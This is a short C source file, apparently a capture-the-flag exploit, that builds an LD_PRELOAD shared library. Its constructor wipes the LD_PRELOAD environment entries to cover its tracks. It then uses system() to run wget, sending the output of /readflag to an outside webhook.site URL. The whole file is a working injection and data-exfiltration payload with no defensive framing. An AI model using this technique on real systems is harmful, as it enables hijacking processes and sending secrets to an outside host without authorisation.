#define _GNU_SOURCE

#include <stdlib.h>
#include <string.h>

extern char **environ;

__attribute__((__constructor__)) void preload(void) {
    // unset environment variable LD_PRELOAD.
    // unsetenv("LD_PRELOAD") no effect on some
    // distribution (e.g., centos), I need crafty trick.
    int i;
    for (i = 0; environ[i]; ++i) {
        if (strstr(environ[i], "LD_PRELOAD")) {
            environ[i][0] = '\0';
        }
    }

    // executive command
    system("wget http://webhook.site/dee201a3-c0ba-45ba-9ad8-c9bf53756008 --post-data $(/readflag)");
}
